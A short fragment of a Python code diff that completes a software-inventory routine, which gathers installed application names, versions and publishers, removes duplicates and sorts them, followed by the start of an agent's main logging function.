+                        software.append({'name': app.get('_name'), 'version': app.get('version'), 'publisher': app.get('obtained_from')})
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        seen = set()
+        unique = []
+        for item in software:
+            nm = item.get('name')
+            if nm and nm not in seen:
+                seen.add(nm)
+                unique.append(item)
+        unique.sort(key=lambda x: (x.get('name') or '').lower())
+        return unique
 def agent_main():
     """Main function for agent mode (original main functionality)."""
     log_message("=" * 60)
